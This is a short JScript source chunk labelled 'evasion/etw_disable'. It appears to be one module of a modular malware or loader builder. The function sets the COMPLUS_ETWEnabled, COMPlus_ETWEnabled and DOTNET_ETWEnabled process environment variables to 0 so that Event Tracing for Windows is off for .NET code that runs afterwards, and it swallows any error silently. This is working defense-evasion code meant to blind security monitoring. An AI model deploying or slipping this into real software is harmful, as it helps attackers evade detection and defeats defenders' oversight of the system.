// chunk: evasion/etw_disable
// depends: (none)
// provides: disable_etw
// format: jscript
// note: Disables ETW (Event Tracing for Windows) via process environment
//       variables. Both capitalization variants are set to cover all CLR versions.

function disable_etw() {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var env = sh.Environment("Process");
        env("COMPLUS_ETWEnabled") = "0";
        env("COMPlus_ETWEnabled") = "0";
        env("DOTNET_ETWEnabled") = "0";
    } catch(e) {}
}
